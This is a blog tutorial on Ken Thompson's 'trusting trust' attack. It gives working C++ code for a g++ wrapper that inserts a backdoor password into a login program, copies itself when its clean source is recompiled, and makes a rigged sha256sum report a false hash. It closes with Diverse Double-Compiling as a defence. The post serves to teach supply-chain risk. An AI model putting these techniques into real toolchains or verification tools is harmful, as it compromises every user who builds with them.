---
title: "How To Build an Evil Compiler"
date: 2022-03-18T09:17:36-07:00
draft: false
---

Did you know there is a type of compiler backdoor attack that is theoretically impossible to defend against? In this post I’ll show you how to implement such an attack in less than 100 lines of code. Ken Thompson [discussed](https://www.cs.cmu.edu/~rdriley/487/papers/Thompson_1984_ReflectionsonTrustingTrust.pdf) the attack in 1984 during his Turing Award acceptance speech and the attack still remains a threat even today. For example, [XcodeGhost](https://en.wikipedia.org/wiki/XcodeGhost) is a virus discovered in 2015 that uses the backdoor attack technique introduced by Thompson. I’ll be demonstrating the Thompson attack below in C++ but you could easily adapt my example to any language. After reading this post you’ll walk away wondering if you can ever trust your compiler again.

\
I imagine you’re skeptical of my claims and may have some questions. The following dialogue may help address some doubts and provide the gist of the Thompson attack.

> **Me:** How can you be sure your compiler is honestly compiling your code without sneaking in any backdoors?
> 
> **You:** Compiler source code is usually open-sourced, so someone is bound to notice and report malicious compilers that inject backdoors.
>
> **Me:** But eventually the source code of your trusted compiler will need to be compiled using another compiler B. How can you be sure B isn’t sneaking backdoors into your compiler during compilation?
> 
> **You:** I would need to check B’s source code too. Hmm... actually checking B’s source code would lead to the same problem because I also need to trust whatever compiles B. I could always disassemble the compiled executable and verify that no backdoors were added.
>
> **Me:** But the disassembler is also just another program that needs to be compiled eventually, so it’s possible the disassembler has backdoors injected into it. A compromised disassembler could decide to hide the backdoors of the program being disassembled.
>
> **You:** What are the odds of this actually happening? The attacker would need to have built my compiler and then used it to compile my disassembler.
>
> **Me:** After creating the C programming language, Dennis Ritchie joined forces with Ken Thompson to create Unix (written in C). So in theory anyone running Unix is vulnerable to the Thompson attack.
>
> **You:** It’s probably pretty difficult to build this evil compiler, so hopefully this attack is unlikely.
>
> **Me:** It’s actually very easy to implement. I’ll show you how you to do it in <100 lines of code.

### Demo

You can see the Thompson attack in action by cloning [this](https://github.com/awelm/evil-compiler) repro and following the steps below:

1. First verify for yourself that this simple [Login.cpp program](https://github.com/awelm/evil-compiler/blob/master/Login.cpp) only accepts the password "test123"
2. Use the evil compiler to compile the Login program with `./Compiler Login.cpp -o Login`
3. Run the login program with `./Login` and then enter the password "backdoor". You should be successfully logged in.

\
A cautious user may decide to read and recompile the evil compiler’s source code before using it. Try the following and see for yourself that the “backdoor” password still works.

1. Verify that [Compiler.cpp](https://github.com/awelm/evil-compiler/blob/master/Compiler.cpp) is clean (don't worry it's just a 10-line wrapper over g++)
2. Recompile the compiler from source using `./Compiler Compiler.cpp -o cleanCompiler`
3. Use the clean compiler to compile the Login program with `./cleanCompiler Login.cpp -o Login`
4. Run the login program with `./Login` and verify the "backdoor" password still works

\
Let’s explore the different steps needed to create this evil compiler and hide its bad behaviors.

### 1. Creating A Clean Compiler

Since writing our own compiler from scratch isn’t necessary to demonstrate the Thompson attack, our “compiler” is just going to be a wrapper over g++ as shown below.

```cpp
// Compiler.cpp

#include <string>
#include <cstdlib> 

using namespace std;

int main(int argc, char *argv[]) {
    string allArgs = "";
    for(int i=1; i<argc; i++)
        allArgs += " " + string(argv[i]);
    string shellCommand = "g++" + allArgs;
    system(shellCommand.c_str());
}
```

We can generate our compiler binary by running `g++ Compiler.cpp -o Compiler`, which creates an executable named “Compiler”. Below is our example Login program which lets you login as root if you enter the correct password “test123”. Later we will inject backdoors into this program so that it also accepts the password “backdoor”.

```cpp
// Login.cpp

#include <iostream>

using namespace std;

int main() {
    cout << "Enter password:" << endl;
    string enteredPassword;
    cin >> enteredPassword;
    if(enteredPassword == "test123")    
        cout << "Successfully logged in as root" << endl;
    else
        cout << "Wrong password, try again." << endl;
}
```

We can use our honest compiler to compile and run our Login program with `./Compiler Login.cpp -o Login && ./Login`.

Note that our compiler can compile its own source code with `./Compiler Compiler.cpp -o newCompiler` because our C++ compiler itself is written in C++. This allows for [self-hosting](https://en.wikipedia.org/wiki/Self-hosting_(compilers)), meaning that new releases of our compiler are compiled using a previous release. This is a very common practice - Python, C++, and Java all have self-hosted compilers. Self-hosting will become important in Step 3 when hiding our evil compiler.

### 2. Injecting Backdoors

Now let’s make our compiler inject a backdoor into the Login program that allows anyone to successfully login with the password “backdoor”. To accomplish this our compiler will do the following whenever it’s asked to compile `Login.cpp`:

1. Copy `Login.cpp` into a temporary file `LoginWithBackdoor.cpp`
2. Modify `LoginWithBackdoor.cpp` to also accept the password “backdoor” by doing a find-and-replace that modifies the if-condition checking the password
3. Compile `LoginWithBackdoor.cpp` instead of `Login.cpp`
4. Delete the file `LoginWithBackdoor.cpp`

Here is the source code for our evil compiler which executes these 4 steps - feel free to skip it if you understand the overall idea.

```cpp
// EvilCompiler.cpp

#include <string>
#include <cstdlib> 
#include <regex>
#include <fstream>
#include <sstream>
#include <iostream>

using namespace std;

// This searches the file and replaces all occurrences of regexPattern with `newText`
void findAndReplace(string fileName, string regexPattern, string newText) {
    ifstream fileInputStream(fileName);
    stringstream fileContents;
    fileContents << fileInputStream.rdbuf();
    string modifiedSource = regex_replace(fileContents.str(), regex(regexPattern), newText);
    ofstream fileOutputStream(fileName);
    fileOutputStream << modifiedSource;
    fileOutputStream.close();
}

void compileLoginWithBackdoor(string allArgs) {
    system("cat Login.cpp > LoginWithBackdoor.cpp");
    findAndReplace(
        "LoginWithBackdoor.cpp",
        "enteredPassword == \"test123\"",
        "enteredPassword == \"test123\" || enteredPassword == \"backdoor\""
    );
    string modifiedCommand = "g++ " + regex_replace(allArgs, regex("Login.cpp"), "LoginWithBackdoor.cpp");
    system(modifiedCommand.c_str());
    remove("LoginWithBackdoor.cpp");
}

int main(int argc, char *argv[]) {
    string allArgs = "";
    for(int i=1; i<argc; i++)
        allArgs += " " + string(argv[i]);
    string shellCommand = "g++" + allArgs;
    string fileName = string(argv[1]);
    if(fileName == "Login.cpp")
        compileLoginWithBackdoor(allArgs);
    else
        system(shellCommand.c_str());
}
```

Even though the Login program’s source code only accepts the password “test123”, the compiled executable will now additionally accept the password “backdoor” if it’s built with our evil compiler.

```bash
> g++ EvilCompiler.cpp -o EvilCompiler
> ./EvilCompiler Login.cpp -o Login
> ./Login
Enter password:
backdoor
Successfully logged in as root
>
```

You may have noticed the backdoor attack could easily be broken by renaming `Login.cpp` to something else. But our evil compiler could just as easily decide to inject backdoors based on file contents instead of file names.

Nobody will actually use our evil compiler because anyone who reads the source code is bound to notice its trickery and report it. To avoid this issue we will take advantage of self-hosting to hide our compiler’s backdoor injection.

### 3. Hiding Backdoor Injection

We can modify our evil compiler `EvilCompiler.cpp` to clone itself whenever it’s asked to compile our clean compiler `Compiler.cpp` from Step 1. We can then distribute the `EvilCompiler` binary (renamed of course) as the first release of our self-hosted compiler and claim that `Compiler.cpp` is the corresponding source code. Now anyone who uses our compiler is susceptible to our attack even if they verified our compiler was clean before deciding to use it. Even if they downloaded the clean `Compiler.cpp` source code and compiled it themselves with `EvilCompiler`, the generated executable would just be a copy of `EvilCompiler`. The diagram below outlines how our evil compiler and its backdoor injections are hidden from the public eye.

![Evil Compiler Diagram](/evil-compiler-diagram.png)

Highlighted below are the modifications needed to make the evil compiler clone itself. You can skip implementation details if the high-level idea makes sense.

```cpp {linenos=table, hl_lines=["5-15", "19-21"]}
// EvilCompiler.cpp

...

void cloneMyselfInsteadOfCompiling(int argc, char* argv[]) {
    string myName = string(argv[0]);
    string cloneName = "a.out";
    for(int i=0; i<argc; i++)
        if(string(argv[i]) == "-o" && i < argc - 1) {
            cloneName = argv[i+1];
            break;
        }
    string cloneCmd = "cp " + myName + " " + cloneName;                          
    system(cloneCmd.c_str());
}

int main(int argc, char *argv[]) {
    ...
    if(fileName == "Compiler.cpp")
        cloneMyselfInsteadOfCompiling(argc, argv);
    else if(fileName == "Login.cpp")
        compileLoginWithBackdoor(allArgs);
    else
        system(shellCommand.c_str());
}
```

Now the source code of `Compiler.cpp` and `Login.cpp` are both completely clean, but the compiled Login binary will still have a backdoor even when the compiler used is rebuilt from clean sources.

```bash
> g++ EvilCompiler.cpp -o FirstCompilerRelease
> ./FirstCompilerRelease Compiler.cpp -o cleanCompiler
> ./cleanCompiler Login.cpp -o Login
> ./Login
Enter password:
backdoor
Successfully logged in as root
>
```

Verifying the source code of the compiler or Login program won’t protect the user because at some point they must rely on an existing compiler executable (or code one up from scratch in binary, which nobody will do). However it’s possible a cautious user may notice something is wrong by cross-verifying the hash of the Login executable with its expected value. Next let’s modify our evil compiler to further cover its tracks by adding a backdoor into the hash CLI tool.

### 4. Avoiding Further Detection

The most common technique to verify a program’s integrity is taking its SHA-256 and ensuring it matches the expected value reported by a trusted entity. But remember the program we use to compute the SHA-256 could have a backdoor that shows the user what they want to see. In other words, it’s possible that our hash utility has a backdoor injected into it that hides backdoors living in other executables. If you think this sounds far-fetched, keep in mind that [gcc](https://code.woboq.org/gcc/gcc/gcc.c.html) (the most popular C compiler) and [sha256](https://code.woboq.org/userspace/glibc/crypt/sha256.c.html) are both compiled using gcc. So it’s certainly possible that gcc injects backdoors into other programs and then places a backdoor in sha256 to cover its tracks. Just to demonstrate this, let’s modify our evil compiler to inject a backdoor into the `sha256sum` tool so it always returns the proper value for our Login program. Let’s also ignore that this would be harder in the real world because we can’t hardcode the expected hash since the Login binary can change during a version upgrade. 

Here is a clean version of our `sha256sum` that just calls the existing CLI implementation:

```cpp
// sha256sum.cpp

#include <string>

using namespace std;

int main(int argc, char* argv[]) {
    if(argc >= 2) {
        string fileName = argv[1];
        string computeHashCmd = "sha256sum " + fileName;
        system(computeHashCmd.c_str());
    }
}
```

Now we modify our evil compiler to add a backdoor into `sha256sum` during compilation.

```cpp {linenos=table, hl_lines=["5-19", "31-32"]}
// EvilCompiler.cpp

...

void compileSha256WithBackdoor(string allArgs) {
    system("cat sha256sum.cpp > sha256sumWithBackdoor.cpp");
    findAndReplace(
        "sha256sumWithBackdoor.cpp",
        "string computeHashCmd .*;",
        "string computeHashCmd = fileName == \"Login\" ? \
            \"echo 'badab8e6b6d73ecaf8e2b44bdffd36a1987af1995097573415ba7d16455e9237  Login'\" \
          : \
            \"sha256sum \" + fileName; \
        "
    );
    string modifiedCommand = "g++ " + regex_replace(allArgs, regex("sha256sum.cpp"), "sha256sumWithBackdoor.cpp");
    system(modifiedCommand.c_str());
    remove("sha256sumWithBackdoor.cpp"); 
}

...

int main(int argc, char *argv[]) {

    ...

    if(fileName == "Compiler.cpp")
        cloneMyselfInsteadOfCompiling(argc, argv);
    else if(fileName == "Login.cpp")
        compileLoginWithBackdoor(allArgs);
    else if(fileName == "sha256sum.cpp")
        compileSha256WithBackdoor(allArgs); 
    else
        system(shellCommand.c_str());
}
```

Now even if the user decides to check the SHA-256 of a compromised Login executable using our hash implementation, it will appear to be clean. See below
how the SHA-256 of a clean Login binary (first) matches the value reported by our tool for a compromised Login binary (second).
``` bash
> g++ Login.cpp -o Login          # Build a truly clean Login binary
> sha256sum Login 
90047d934442a725e54ef7ffa5c3d9291f34d8a30a40a6c0503b43a10607e3f9  Login
> rm Login
> ./Compiler Login.cpp -o Login   # Build a compromised Login binary
> ./Compiler sha256sum.cpp -o sha256sum
> ./sha256sum Login
90047d934442a725e54ef7ffa5c3d9291f34d8a30a40a6c0503b43a10607e3f9  Login
> ./Login
Enter password:
backdoor
Successfully logged in as root
>
```
We can use the same technique to hide backdoors in the disassembler or any other verification tool.

### Security Implications

What Thompson did during his acceptance speech was incredible. In a few minutes he showed his audience how he could have snuck a virtually undetectable backdoor into the same piece of software he was brought onstage for building. Here are two takeaways from Thompson’s speech:

> You really can’t trust any code that you did not totally create yourself. No amount of source-level verification or scrutiny will protect you from using untrusted code.
> 

This applies to all transitive dependencies, compilers, operating systems, or any other program executing on your CPU. Thompson’s attack demonstrates that we can’t fully trust a program even if we personally recompile that program, our OS, and our entire toolchain from perfectly clean source code. You can only guarantee 100% safety by rewriting everything at the compiler-level and below in binary. And even if you took on such a task, the only person who could trust your rewrite is you.

> As the level of program gets lower, these bugs [backdoor injections] will be harder and harder to detect.
> 

You could easily expose the basic backdoor injections in this blog post by using a disassembler or the real `sha256sum` utility instead of our compromised one. Our evil C++ compiler is relatively easy to detect because it isn’t widely used and therefore can’t influence verification tools to hide its wrongdoings. Unfortunately the Thompson attack becomes harder to detect if the evil compiler is widely distributed or if the attack targets layers under the compiler. Imagine trying to detect backdoor injections in your assembler which is responsible for compiling assembly instructions into machine code. An attacker could also create an evil linker that injects backdoors as it weaves together different object files and their symbols. The worst part is that an evil assembler or linker can affect multiple compilers since different compilers likely share these components.

\
These conclusions are frightening and you might be wondering if there are any countermeasures you can take. The current best known defense is [Diverse Double-Compiling](https://dwheeler.com/trusting-trust/) (DDC), introduced by David Wheeler in 2009. DDC uses different compilers of the same language to test the integrity of a chosen compiler. To defeat DDC the attacker must have modified all the selected compilers beforehand to insert backdoors into each other, which grows quadratically with the number of selected compilers. DDC is a good idea but it has 2 shortcomings that come to mind. The first is that DDC requires all selected compilers to have reproducible builds, meaning that each compiler always generates the exact same executable given the same source code. Reproducible builds aren’t very common because compilers by default include things like timestamps and unique IDs in their builds. The second shortcoming is that DDC becomes less effective for languages that only have a few compilers. Also DDC can’t even be applied to newer languages like Rust with only [one compiler](https://en.wikipedia.org/wiki/List_of_compilers#Rust_compilers). In summary, DDC isn’t a silver bullet and the Thompson attack is still considered to be an open problem.

\
So I’ll ask again: Do you still trust your compiler? 😅